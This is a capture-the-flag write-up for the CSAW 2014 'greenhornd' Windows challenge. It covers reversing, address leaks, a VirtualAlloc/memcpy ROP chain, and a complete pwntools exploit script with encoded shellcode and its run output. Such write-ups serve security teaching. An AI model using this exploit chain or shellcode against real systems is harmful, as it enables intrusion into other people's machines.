# Csaw 2014 greenhornd

This writeup is based off of:
```
https://www.hackucf.org/csaw-2014-exploitation-400-greenhornd-exe/

some of noopnoop's work
noop didn't make the writeup linked above, he just helped me exploit this
```

If it sucks, I'm sorry, I don't have a lot of windows exploitation experience.

Starting off, I ran this app in `AppJailLauncher.exe`, and just talked to it over the network. You can run `AppJailLauncher.exe` from the command line with the following command. One thing to consider, the goal is to read the contents of the `key` file, not pop a shell.

```
C:\AppJailLauncher.exe /network /key:key /port:9998 /timeout:30 greenhornd.exe
Listening for incoming connections on port 9998...
  Client connection from 192.168.13.145 accepted.
  Client connection from 192.168.13.145 accepted.
  Client connection from 192.168.13.145 accepted.
```

Also for this challenge, I used windbg and ghidra.

## Reversing

So starting off, we look at the binary and check string references to the strings we found in the prompt. We find this function at `0x401000`:

```

/* WARNING: Removing unreachable block (ram,0x00401159) */

undefined4 funFunction(void)

{
  FILE *pFVar1;
  uint uVar2;
  char *_Buf;
  int _Mode;
  size_t _Size;
  char input [1024];
 
  _Size = 0;
  _Mode = 4;
  _Buf = (char *)0x0;
  pFVar1 = __iob_func();
  setvbuf(pFVar1 + 1,_Buf,_Mode,_Size);
  FUN_004014d0(
              "Wecome to the Greenhorn CSAW service!\nThis service is a Windows 8.1 Pwnable!You\'re going to need a Windows 8.1 computer or VM to solve this one. If you don\'thave a Windows Key, I suggest using Amazon EC2:http://aws.amazon.com/windows/\n\nWindows Exploitation is new to a lot of you, sothis is a tutorial service! To start, let\'s install some software you\'ll need tofollow along:\n\tWindows SDK for the debugging tools(http://msdn.microsoft.com/en-us/windows/desktop/bg162891.aspx)\n\tMSYS for nicecommand line tools (http://www.mingw.org/wiki/MSYS)\n\tIDA Free(https://www.hex-rays.com/products/ida/support/download_freeware.shtml)\n\tNASM forWindows (http://www.nasm.us/pub/nasm/releasebuilds/2.11.05/win32/)\n\nTo continue,you\'re going to need the password. You can get the password by running strings fromminsys (strings - greenhorn.exe) or locate it in IDA.\n\nPassword: "
              );
  uVar2 = scanInput((int)input,0x400,'\n');
  input[uVar2] = '\0';
  _Mode = strncmp(input,"GreenhornSecretPassword!!!",0x1b);
  if (_Mode != 0) {
    FUN_004014d0("Incorrect Password.\n");
    return 0;
  }
  FUN_004014d0("Password accepted.\n");
  FUN_004014d0(
              "Greenhorn Menu:\n--------------\n\t(D)ebugging\n\t(S)taticAnalysis\n\tS(h)ellcode\n\t(A)SLR\n\t(N)X/DEP\n\t(V)ulnerability\n\t(Q)uit\n\nSelection: "
              );
  scanInput((int)input,2,'\n');
  input[1] = '\0';
  switch(input[0]) {
  case 'A':
  case 'a':
    FUN_00401320();
    break;
  default:
    FUN_004014d0("Invalid entry\n");
    break;
  case 'D':
  case 'd':
    FUN_004012a0();
    break;
  case 'H':
  case 'h':
    FUN_004013a0();
    break;
  case 'N':
  case 'n':
    FUN_004013c0();
    break;
  case 'Q':
  case 'q':
    FUN_004013e0();
    return 0;
  case 'S':
  case 's':
    FUN_004012c0();
    break;
  case 'V':
  case 'v':
    vulnerabillity();
  }
}
```

So we can see, that the password is `GreenhornSecretPassword!!!`. When we give it that password, we see that we get a menu.

```
nc 192.168.13.1 9998
Wecome to the Greenhorn CSAW service!
This service is a Windows 8.1 Pwnable! You're going to need a Windows 8.1 computer or VM to solve this one. If you don't have a Windows Key, I suggest using Amazon EC2: http://aws.amazon.com/windows/

Windows Exploitation is new to a lot of you, so this is a tutorial service! To start, let's install some software you'll need to follow along:
    Windows SDK for the debugging tools (http://msdn.microsoft.com/en-us/windows/desktop/bg162891.aspx)
    MSYS for nice command line tools (http://www.mingw.org/wiki/MSYS)
    IDA Free (https://www.hex-rays.com/products/ida/support/download_freeware.shtml)
    NASM for Windows (http://www.nasm.us/pub/nasm/releasebuilds/2.11.05/win32/)

To continue, you're going to need the password. You can get the password by running strings from minsys (strings - greenhorn.exe) or locate it in IDA.

Password: GreenhornSecretPassword!!!
Password accepted.
Greenhorn Menu:
--------------
    (D)ebugging
    (S)tatic Analysis
    S(h)ellcode
    (A)SLR
    (N)X/DEP
    (V)ulnerability
    (Q)uit

Selection:
```

## Infoleak & Buffer Overflow

Now there are two bugs in this code. The first is an infoleak, the second is a buffer overflow.

```
Selection: A


Address Space Layout Randomization
----------------------------------

ASLR on Windows works a lot like it does on Linux. The big difference is on Windows the executable itself always rebases. No need to specify -fPIE!
Unlike on Linux, Windows executables don't realy on PIC for relocation. The dynamic loader actually parses out a PE section called '.reloc' and applies the ASLR delta directly to that (after fixing up page permissions).

On Windows 8.1, nearly every executable and library on the entire system is ASLR-compatible and the dynamic loader rebases them all independently. For more reading on Windows ASLR, check out this presentation:  https://www.blackhat.com/presentations/bh-dc-07/Whitehouse/Presentation/bh-dc-07-Whitehouse.pdf

Normally, you'd have to find an information disclosure to leak back program state (via an uninitialized variable, a forced type confusion, or a use after free) to leak the ASLR slide.

However, this is a greenhorn challenge, so your ASLR slide is: 0x00880000 and the slide variable is stored at: 0x008ff6e4.

Greenhorn Menu:
--------------
        (D)ebugging
        (S)tatic Analysis
        S(h)ellcode
        (A)SLR
        (N)X/DEP
        (V)ulnerability
        (Q)uit

Selection: Invalid entry
Greenhorn Menu:
--------------
        (D)ebugging
        (S)tatic Analysis
        S(h)ellcode
        (A)SLR
        (N)X/DEP
        (V)ulnerability
        (Q)uit

Selection: V


VULNERABLE FUNCTION
-------------------
Send me exactly 1024 characters (with some constraints)
```

So we can see that the two address that were leaked were `0x880000` and `0x8ff6e4`. The following propmt is from windbg:

```
0:000> db esp
008ff2e0  ec f2 8f 00 00 08 00 00-0a 00 00 00 88 76 03 00  .............v..
008ff2f0  36 00 00 00 96 5b 90 77-de 7e 29 35 80 76 03 00  6....[.w.~)5.v..
008ff300  63 00 00 50 00 00 03 00-00 02 04 06 63 01 00 50  c..P........c..P
008ff310  27 00 04 23 42 84 7e 13-1c 32 03 00 00 00 00 00  '..#B.~..2......
008ff320  48 f5 8f 00 64 f3 8f 00-00 02 04 06 00 00 00 00  H...d...........
008ff330  0c 00 04 08 28 15 9e 77-04 00 00 00 40 01 00 00  ....(..w....@...
008ff340  00 06 00 00 00 00 00 00-34 01 00 00 63 01 00 50  ........4...c..P
008ff350  88 76 03 00 99 b4 91 77-0c fe ff ff 63 01 00 50  .v.....w....c..P
0:000> k
 # ChildEBP RetAddr  
WARNING: Stack unwind information not available. Following frames may be wrong.
00 008ff6ec 00c8113c greenhornd+0x1234
01 008ffb00 00c8188b greenhornd+0x113c
02 008ffb40 75d60419 greenhornd+0x188b
03 008ffb50 7792662d KERNEL32!BaseThreadInitThunk+0x19
04 008ffbac 779265fd ntdll!__RtlUserThreadStart+0x2f
05 008ffbbc 00000000 ntdll!_RtlUserThreadStart+0x1b
```

So we can see here that our input is stored at `0x8ff2ec`. We also see that the return address is stored at `0x8ff6ec`. First off that gives us a `0x8ff6ec - 0x8ff2ec = 0x400` bytes. Since we can scan in `0x800` bytes, we have a buffer overflow. On top of that, when we check the memory mappings of the program, we can see that the second infoleak address `0x8ff6e4` is to the stack (if it wasn't obvious already):

```
0:000> !address

                                     
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

  BaseAddr EndAddr+1 RgnSize     Type       State                 Protect             Usage
-----------------------------------------------------------------------------------------------
+        0    10000    10000             MEM_FREE    PAGE_NOACCESS                      Free       

.    .    .

    8fd000   900000     3000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Stack      [~0; 3804.4ccc]
```

Also we can see that the offset from the stack infoleak to our input is `0x8ff2ec - 0x8ff6e4 = -0x3f8` bytes. So using the second infoleak, we know where our input is in memory. Now for the first infoleak `0x00880000`. When we check the memory mappings with `!address`, we see that it belongs to this memory segment:

```
    7a2000   800000    5e000 MEM_PRIVATE MEM_RESERVE                                    <unknown>  
```

Now specifically what this address is to, is the base of the program. For instance, we can see that the instructions at `0x401210` in the binary are:
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall vulnerabillity(void)
             undefined         AL:1           <RETURN>
             undefined1        Stack[-0x403   local_403                               XREF[1]:     00401259(*)  
             char              Stack[-0x404   vulnBuf                                 XREF[2]:     0040122d(*),
                                                                                                   00401244(*)  
                             vulnerabillity                                  XREF[1]:     funFunction:00401137(c)  
        00401210 55              PUSH       EBP
        00401211 8b ec           MOV        EBP,ESP
        00401213 81 ec 00        SUB        ESP,0x400
                 04 00 00
        00401219 68 28 21        PUSH       s__VULNERABLE_FUNCTION_-----------_00402128      = "\n\nVULNERABLE FUNCTION\n----
                 40 00
        0040121e e8 ad 02        CALL       printText                                        undefined printText(char * param
                 00 00
        00401223 83 c4 04        ADD        ESP,0x4
        00401226 6a 0a           PUSH       0xa
        00401228 68 00 08        PUSH       0x800
                 00 00
```

Now when we check that in memory with the debugger, we can add the address to the base and see that they are the same insructions (`0x401210 + 0x880000 = 0xc81210`):

```
0:000> u c81210
greenhornd+0x1210:
00c81210 55              push    ebp
00c81211 8bec            mov     ebp,esp
00c81213 81ec00040000    sub     esp,400h
00c81219 682821c800      push    offset greenhornd+0x2128 (00c82128)
00c8121e e8ad020000      call    greenhornd+0x14d0 (00c814d0)
00c81223 83c404          add     esp,4
00c81226 6a0a            push    0Ah
00c81228 6800080000      push    800h
```

also this might help a little bit:
```
0:000> u c81210
greenhornd+0x1210:
00c81210 55              push    ebp
00c81211 8bec            mov     ebp,esp
00c81213 81ec00040000    sub     esp,400h
00c81219 682821c800      push    offset greenhornd+0x2128 (00c82128)
00c8121e e8ad020000      call    greenhornd+0x14d0 (00c814d0)
00c81223 83c404          add     esp,4
00c81226 6a0a            push    0Ah
00c81228 6800080000      push    800h
```

## Exploitation

So we have a stack infoleak, an infoleak into the binary, and a buffer overflow bug. Now the end goal will be to call shellcode that prints out the flag (the app armor jail restricts what the process can do once we have code execution). Now since NX / DEP is enabled, we can't execute shellcode on the stack. Instead what we will do is jump in between places in the binary to accomplish several tasks (so ROP). The first task will be allocated `rwx` memory. The second task will be to copy our shellcode to the `rwx` region. After that we will jump to our shellcode in the `rwx` region, and get code execution through that.

Now before we start ROPing, there is a `POP` instruction. We will need to include an extra `4` byte value here in our rop chain to account for this.

```
        00401297 8b e5           MOV        ESP,EBP
        00401299 5d              POP        EBP
        0040129a c3              RET
```

So to reach the return address with the buffer overflow, and deal with the `POP EBP`, we will have the following values added to our payload:

```
payload = ''

payload = "C"
payload += "0"*0x3ff
```

Also one thing to consider, the stack leak we get is `0x3f8` bytes ahead of the start of our input. Thus the stack leak we get points to the final `0x4` bytes of the initial data to reach the return address.


#### Exploitation - VirtualAlloc Call

So we will need to call VirtualAlloc, in order to allocate the space for our shellcode. Checking the references to the imported `VirtualAlloc` function, we find this function at `0x4011c0` in the binary that calls it. Since we have the binary leak, we know where this function is in memory.

```
                             FUN_004011c0                                    XREF[1]:     aslr:00401333(c)  
        004011c0 55              PUSH       EBP
        004011c1 8b ec           MOV        EBP,ESP
        004011c3 8b 45 10        MOV        EAX,dword ptr [EBP + param_3]
        004011c6 50              PUSH       EAX
        004011c7 68 00 30        PUSH       0x3000
                 00 00
        004011cc 8b 4d 0c        MOV        ECX,dword ptr [EBP + param_2]
        004011cf 51              PUSH       ECX
        004011d0 8b 55 08        MOV        EDX,dword ptr [EBP + param_1]
        004011d3 52              PUSH       EDX
        004011d4 ff 15 00        CALL       dword ptr [->KERNEL32.DLL::VirtualAlloc]
                 20 40 00
        004011da 8b 4d 14        MOV        ECX,dword ptr [EBP + param_4]
        004011dd 89 01           MOV        dword ptr [ECX],EAX
        004011df 8b 55 14        MOV        EDX,dword ptr [EBP + param_4]
        004011e2 8b 02           MOV        EAX,dword ptr [EDX]
        004011e4 5d              POP        EBP
        004011e5 c3              RET
```

Now for Virtual Alloc, there are four arguments we will provide to it. Now one thing we see is that only three of the arguments are taken from the stam. There is one argument `0x3000` that is hard coded in. However our arguments that are used start `0x8` bytes after the start of the stack, so we will need to have a placeholder value there (the other `0x4` bytes will be taken up by a gadget, which will be the return address). For the other three arguments, we have to designate the size `0x400`, the permissions to be `rwx` (`0x40`), and the address in memory to write a ptr to the newly allocated space.

After that, we will need a gadget to pop the values off of our rop chain, so it doesn't crash. For this we can use the gadget at `0x40199e` to pop 4 values off of the stack.

```
                             LAB_0040199e                                    XREF[1]:     00401992(j)  
        0040199e 5f              POP        EDI
        0040199f 5e              POP        ESI
        004019a0 5b              POP        EBX
        004019a1 5d              POP        EBP
        004019a2 c3              RET
```

We can just add this right after the virtualAlloc call, and it will clean up the ROP chain for us.

So our rop chain will have this added to it:
```
ropChain += p32(virtualAlloc)

ropChain += p32(pop4)

ropChain += p32(0x31313131)

ropChain += p32(0x400)

ropChain += p32(0x40)

ropChain += p32(ropStart + 0x28)
```

#### Exploitation - Memcpy

So now that we have allocated the memory to write our shellcode, the next step is to write the shellcode to it using a `memcpy` winapi, which we can find at `0x4011f0`:

```
        004011f0 55              PUSH       EBP
        004011f1 8b ec           MOV        EBP,ESP
        004011f3 8b 45 10        MOV        EAX,dword ptr [EBP + param_3]
        004011f6 50              PUSH       EAX
        004011f7 8b 4d 0c        MOV        ECX,dword ptr [EBP + param_2]
        004011fa 51              PUSH       ECX
        004011fb 8b 55 08        MOV        EDX,dword ptr [EBP + param_1]
        004011fe 52              PUSH       EDX
        004011ff e8 80 04        CALL       memcpy                                           void * memcpy(void * _Dst, void
                 00 00
        00401204 83 c4 0c        ADD        ESP,0xc
        00401207 8b 45 08        MOV        EAX,dword ptr [EBP + param_1]
        0040120a 5d              POP        EBP
        0040120b c3              RET
```

For this, we will need three arguments. The destination pointer (in the rop chain we will just have a placeholder value there, which will be overwritten with the pointer to our allocated space in the `virtualAlloc` winapi call). Then we will have the src pointer which will point to the shellcode on our ROP chain. Finally after that we will have the size of the data, `0x400` bytes. Of course we will also need to have our shellcode on the ROP Chain.

The return address (stored in `eax`) from the `memcpy` winapi is the ptr which is written to. So after the `memcpy` winapi call, we just need to call eax, and that will execute out shellcode. Luckily for us, there is a gadget for that at `0x401c6b`.

So with that, we can finish off our ROPchain / payload with this:

```
ropChain += p32(memcpy)

ropChain += p32(pop4)

ropChain += p32(0x31313131)

ropChain += p32(ropStart + 0x3c)

ropChain += p32(0x400)

ropChain += p32(0x32323232)

ropChain += p32(callEax)

shellcode = "\x90\x6A\x53\x90\xbe\x30\x3f\x47\x5c\xda\xc7\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x43\x31\x77\x14\x03\x77\x14\x83\xef\xfc\xd2\xca\x2d\x6c\x4c\x51\x39\x8a\xfb\xe9\x31\x18\x8d\x1d\xc1\x58\x61\x1b\xd5\x74\x81\x23\x85\xff\xb7\xa8\x13\x8b\xe1\xbe\x33\x2e\x1a\xbf\xbf\x62\xcc\x28\x3f\x83\x0c\x3f\x2b\xe6\x75\xbf\x22\x0f\xd7\xd7\x34\xd0\xd7\x27\x5d\x50\xd7\x27\x9d\x38\xd4\x27\x9d\xb8\xb2\x27\x9d\xb8\x42\x40\x9c\xb8\x42\x90\xf6\xb8\x42\x90\x86\xee\xbd\x40\xdc\x99\x86\x09\xf7\xfc\xf2\xda\xa5\x16\x62\xdb\x49\xe7\xe3\x37\x49\xe5\xe3\xc7\xc3\x08\xb2\xaf\xd3\xca\x34\x30\x85\x4b\xdd\x30\x27\x4c\x1d\x59\x27\x4e\x1d\x99\x76\x19\xe2\x49\x21\x24\xf5\x6a\xd0\x26\x05\xea\x10\x22\x07\xec\x98\x73\x02\x8c\x9c\x83\x0c\xcd\x71\x8f\x08\xcd\x89\xf8\x10\xcc\x89\xf8\x41\x31\x59\xae\x36\x46\x2e\x6b\xb4\x69\x30\x8f\xf5\x49\x62\x48\x15\x3d\x71\x68\x1a\xb3\x84\xad\x4d\x23\x79\xce\x72\x35\x7e\x6e\xd2\x84\x7b\x91\x8a\x83\xe8\xb5\x6e\x1f\xb5\x89\xe5\x4b\x33\x8a\xf8\x99\xb0\x20\xe2\xd6\x9d\x94\x13\x02\xc2\xff\x5a\x5f\x31\x8b\x5d\xb1\x6c\x63\xe6\xb2\x6e\x8c\x23\x09\xb5\x5b\x26\x7d\x3e\xc1\xec\x7c\xaa\x90\x67\x72\x67\xd6\x2d\x97\x76\x03\x5a\xa3\xf3\xd2\xb4\x45\x01\xd5\x44\x96\x37\x15\xcd\xd2\x13\x89\xac\x18\x53\xb1"

ropChain += shellcode
```

Also one thing to keep in mind, shellcoding on windows is way different than shellcoding on linux. This is primarily because with windows shellcoding, you can't make syscalls directly, so you have to jump through some hoops. The shellcode I used here is from the referenced writeup.

## Exploit

Putting it all together, we have the following exploit:
```
'''
This exploit is based off of:
https://www.hackucf.org/csaw-2014-exploitation-400-greenhornd-exe/
some of noopnoop's work
'''

from pwn import *

target = remote('192.168.13.1', 9998)

def getMenu():
  target.recvuntil("Selection: ")

def leak():
  getMenu()
  target.sendline("A")
  target.recvuntil("ASLR slide is: ")
  leak = target.recvuntil("and")
  base = int(leak.strip(" and"), 16)
  target.recvuntil("stored at: ")
  leak = target.recvuntil(".")
  stackLeak = int(leak.strip("."), 16)
  return base, stackLeak

target.sendline("GreenhornSecretPassword!!!")

base, stackleak = leak()

pie = base + 0x400000
virtualAlloc = pie + 0x11C0
pop4 = pie + 0x199E
memcpy = pie + 0x11F0
callEax = pie + 0x1C6B

inputBase = stackleak - 0x3f8
newEbp = inputBase + 0x500

log.info("Base is: " + hex(base))
log.info("Stack infoleak: " + hex(stackleak))

target.sendline('V')
print target.recvuntil("constraints).\n\n")

payload = "C"
payload += "0"*0x3ff

# Calculate the address of the start of our rop chain
ropStart = stackleak + 0x4

ropChain = ""

# The start of our rop chain, which is just a value to deal with the `pop ebp`
ropChain += p32(0x30303030)

# Call Virtual Alloc
ropChain += p32(virtualAlloc)

# Pop off the four arguments of virtual alloc off of the rop chain
ropChain += p32(pop4)

# Our 4 Arguments to virtual Alloc

# This is just a place holder value
ropChain += p32(0x31313131)

# Size of the memory space
ropChain += p32(0x400)

# Permissions to our memory region
ropChain += p32(0x40)

# The address in memory where a ptr to the allocated space will be written
# This spot will be where the `p32(0x32323232)` spot in our rop chain is
ropChain += p32(ropStart + 0x28)



# Call Memcpy function
ropChain += p32(memcpy)

# Clean up the arguments
ropChain += p32(pop4)

# Our Arguments to memcpy

# This will hold the address of the allocated memory, which was overwritten durring the virtualalloc winapi call
# This is the address that memcpy will write to
ropChain += p32(0x31313131)

# This holds the address of the data which will be read, which is our shellcode further down the rop chain
ropChain += p32(ropStart + 0x3c)

# This is the amount of bytes which memcpy will write
ropChain += p32(0x400)

# Another value to deal with the `add esp; pop ebp`
ropChain += p32(0x32323232)

# After memcpy is called, the return value (stored in eax)
# Will be the address that is written to, in other words where our shellcode in executable memory is
# So we just need to call eax to run the shellcode
ropChain += p32(callEax)

# Add our shellcode
shellcode = "\x90\x6A\x53\x90\xbe\x30\x3f\x47\x5c\xda\xc7\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x43\x31\x77\x14\x03\x77\x14\x83\xef\xfc\xd2\xca\x2d\x6c\x4c\x51\x39\x8a\xfb\xe9\x31\x18\x8d\x1d\xc1\x58\x61\x1b\xd5\x74\x81\x23\x85\xff\xb7\xa8\x13\x8b\xe1\xbe\x33\x2e\x1a\xbf\xbf\x62\xcc\x28\x3f\x83\x0c\x3f\x2b\xe6\x75\xbf\x22\x0f\xd7\xd7\x34\xd0\xd7\x27\x5d\x50\xd7\x27\x9d\x38\xd4\x27\x9d\xb8\xb2\x27\x9d\xb8\x42\x40\x9c\xb8\x42\x90\xf6\xb8\x42\x90\x86\xee\xbd\x40\xdc\x99\x86\x09\xf7\xfc\xf2\xda\xa5\x16\x62\xdb\x49\xe7\xe3\x37\x49\xe5\xe3\xc7\xc3\x08\xb2\xaf\xd3\xca\x34\x30\x85\x4b\xdd\x30\x27\x4c\x1d\x59\x27\x4e\x1d\x99\x76\x19\xe2\x49\x21\x24\xf5\x6a\xd0\x26\x05\xea\x10\x22\x07\xec\x98\x73\x02\x8c\x9c\x83\x0c\xcd\x71\x8f\x08\xcd\x89\xf8\x10\xcc\x89\xf8\x41\x31\x59\xae\x36\x46\x2e\x6b\xb4\x69\x30\x8f\xf5\x49\x62\x48\x15\x3d\x71\x68\x1a\xb3\x84\xad\x4d\x23\x79\xce\x72\x35\x7e\x6e\xd2\x84\x7b\x91\x8a\x83\xe8\xb5\x6e\x1f\xb5\x89\xe5\x4b\x33\x8a\xf8\x99\xb0\x20\xe2\xd6\x9d\x94\x13\x02\xc2\xff\x5a\x5f\x31\x8b\x5d\xb1\x6c\x63\xe6\xb2\x6e\x8c\x23\x09\xb5\x5b\x26\x7d\x3e\xc1\xec\x7c\xaa\x90\x67\x72\x67\xd6\x2d\x97\x76\x03\x5a\xa3\xf3\xd2\xb4\x45\x01\xd5\x44\x96\x37\x15\xcd\xd2\x13\x89\xac\x18\x53\xb1"

ropChain += shellcode

# Add the ropChain to the payload, and send it
payload = payload + ropChain
target.sendline(payload)

target.interactive()
```

When we run the exploit:
```
$ python exploit.py
[+] Opening connection to 192.168.13.1 on port 9998: Done
[*] Base is: 0x490000
[*] Stack infoleak: 0x99fa70


Greenhorn Menu:
--------------
    (D)ebugging
    (S)tatic Analysis
    S(h)ellcode
    (A)SLR
    (N)X/DEP
    (V)ulnerability
    (Q)uit

Selection:

VULNERABLE FUNCTION
-------------------
Send me exactly 1024 characters (with some constraints).


[*] Switching to interactive mode
flag{insert_flag_here}\x99\x00\xac����\x99\x000��\xff\\x00\x00\x00<��r\x0bw�1�\x0��\x00\x00\x00\x00\x00\x00\x000��\x0bw�1�\x00000\x0\x00\x00\x00�w\x00\x00\x00B\x00\x07w\x00\x00\x00\x00B\x0(��\x00\x00\x00B\x00\x00\x00�1�\x00\x00\x00\x00\x00\x05\x00\x00\x00 \x00\x00C\x00:\x00\\x00U\x00s\x00e\x00r\x00s\x00\\x00g\x00u\x00y\x00i\x00n\x00a\x00t\x00u\x00x\x00e\x00d\x00o\x00\\x00D\x00e\x00s\x00k\x00t\x00o\x00p\x00\\x00k\x00e\x00y\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
```

Just like that, we got the flag!
